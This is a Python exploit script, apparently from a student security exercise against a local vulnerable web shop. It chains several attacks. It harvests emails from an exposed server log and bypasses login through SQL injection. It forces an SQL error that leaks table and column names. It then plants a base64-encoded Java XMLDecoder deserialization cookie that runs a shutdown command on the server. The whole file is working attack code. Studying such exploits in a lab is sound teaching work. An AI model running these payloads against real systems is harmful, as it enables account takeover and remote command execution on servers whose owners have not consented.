import requests
import urllib.parse
import base64 
import re
from selenium import webdriver
from time import sleep
from bs4 import BeautifulSoup

url_login = "http://localhost:8888/login"
url_log = "http://localhost:8888/resources/server.log"
dummy_login = "http://localhost:8888/products?category=Laptops"
main_url = "http://localhost:8888"
url_profile = "http://localhost:8888/profile"

session = requests.Session()

xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<java version="1.4.0" class="java.beans.XMLDecoder">
   <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
        <string>shutdown /r</string>
      </void>
   </object>
</java>"""


def showMessage():
    '''
    This method shows the initial message 
    '''

    print("\nScript 3: Group 3. Security Application")

    print("\nThis script take advantage of 3 vulnerabilities of target website")
    print("\t1-CWE-89: SQLi")
    print("\t2-CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')")
    print("\t3-CWE-502: Deserialization of Untrusted Data")
    print("\t4-CWE-201: Information Exposure Through Sent Data")

    print("""\nThis is script is going to ask you a valid email to perfom SQLinjection and you can choose between 2 options:
        1-You can shutdown the server
        2-You can open the browser by using the email session 
     """)
    
def askEmail():
    '''
    This method asks user which email wants to use
    '''
    email = input("\nWhich email you wants to use to perform the SQL Injection?: ")
    return email

def askShutdownOption():
    '''
    This method asks user if he/she wants to shutdown the server or if he/she prefers to just open a browser with the given email.
    Returns 0 if the user select no and 1 otherwise
    '''
    option = input("\nDo you want to shutdown the browser?.\nIf you type no, a browser will be open with given email session: ")

    while(option.lower() !="n" and option.lower() !="y" and option.lower() !="no" and option.lower() !="yes"):
        option = input("Do you want to shutdown the browser?. \nIf you type 'n', a browser will be open with given email session: ")
    
    if(option.lower() == "n" or option.lower()=="no"):
        return 0
    else:
        return 1

def getCookie():
    '''
    This method does one get request and returns the obtained cookie
    It is possible due to application doesn't renovate the cookie after doing login
    '''

    r1 = session.get("http://localhost:8888/")
    return r1.cookies

def generateMaliciousXMLCookie():
    '''
    This method generates the base64 cookie with the shutdown command and returns it
    '''
    xml_data_encoded = xml_data.encode("utf-8") 
    xml_base64 = base64.b64encode(xml_data_encoded) 

    return xml_base64.decode('utf-8')


def scourLogSearchingForEmails():
    '''
    This method scours the server.log searching for available emails and prints it 
    '''

    response = session.get(url_log)
    availableEmails = re.findall("[A-z0-9]+@[A-z]+.[A-z]+", response.text)

    print("\nThe available emails are the following: ")

    if(len(availableEmails)==0):
        print("There are not available emails in server log.")
    else:
        #Remove the repeated elements
        availableEmails = list(set(availableEmails))
        
        #Prints the available emails
        for email in availableEmails:
            print("\t-" + str(email))

    return availableEmails
    

def performSQLi(username, cookie):
    '''
    This method perform a SQLI attack taking advantage that the server doesn't validate the input values in post requests
    Using the 
    '''

    headers = {
        "Host": "localhost:8888",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://localhost:8888/login",
        "Connection": "keep-alive",
    }

    sqli = str(username) + "' OR '1'='1"

    data = {
        "email": str(sqli),
        "password": "dummy_password", #This password doesn't really matter
        "rememberMe": "true",
        "_rememberMe": "on"
    }

    response = session.post(url_login, headers=headers, data=data, cookies=cookie)

    if (int(response.text.find("Login")) == -1):
        return True, session.cookies
    else:
        return False, 0
    

def performShowSQLTables(username, cookie):
    '''
    This method performs a SQLI attack taking advantage that the server doesn't validate the input values in post requests
    '''

    headers = {
        "Host": "localhost:8888",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://localhost:8888/profile",
        "Connection": "keep-alive",
    }

    data = {
       "name": "Random",
       "email": username,
       "address": "Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain Spain ",
    }

    print("\nIdentifying table name and columns...")

    response = session.post(url_profile, headers=headers, data=data, cookies=cookie)

    soup = BeautifulSoup(str(response.text), 'html.parser')
    specific_span = soup.find(lambda tag: tag.name == 'span' and 'could not execute statement' in tag.text)
    if specific_span:
        pattern = re.compile(r'update\s+(\w+)\s+set\s+(.*?)\s+where\s+\w+\s*=\s*\?')
        matches = pattern.findall(specific_span.text)
        if matches:
            # The first match contains the table name
            table_name = matches[0][0]

            # The second match contains the columns
            columns = matches[0][1].split(',')

            # Delete unecessary characters
            columns = [col.strip().replace('=?', '') for col in columns]

            print("\tTable Name: " + str(table_name))
            print("\tColumns Names: ")
            for column in columns:
                print("\t\t-" + str(column))

            return table_name, columns
    return "None", []


def launchBrowser(option,jsessionid_cookie):
    '''
    This method opens a browser depending on option variable
        -option=0: opens it using the session 
        -option=1: opens it to shutdown the server
    '''

    browser = webdriver.Chrome()

    browser.get(main_url)

    if(option==0):
        #Replacing the JSESSIONID
        browser.add_cookie({
            'name' : 'JSESSIONID',
            'value' : jsessionid_cookie   
            })

    else:
        malicousXMLCookie = generateMaliciousXMLCookie()
        browser.add_cookie({
        'name' : 'user-info',
        #'value' : 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPGphdmEgdmVyc2lvbj0iMS40LjAiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICA8b2JqZWN0IGNsYXNzPSJqYXZhLmxhbmcuUnVudGltZSIgbWV0aG9kPSJnZXRSdW50aW1lIj4KICAgICAgPHZvaWQgbWV0aG9kPSJleGVjIj4KICAgICAgICA8c3RyaW5nPnNodXRkb3duIC9yPC9zdHJpbmc+CiAgICAgIDwvdm9pZD4KICAgPC9vYmplY3Q+CjwvamF2YT4='   
        'value' : malicousXMLCookie
        })
        
    browser.refresh()

    while(True):
        pass



if __name__ == '__main__':

    showMessage()

    cookie = getCookie()

    availableEmails = scourLogSearchingForEmails()
    
    email = askEmail()

    result, cookie = performSQLi(email,cookie)
    
    performShowSQLTables(email,cookie)

    if(result):
        print("\nSQLi performed sucessfully!")

        option = askShutdownOption()

        launchBrowser(option,str(cookie["JSESSIONID"]))

    else:
        print("\nError performing the SQL Injection. Maybe the email doesn't exist. Make you that you typed it correctly")









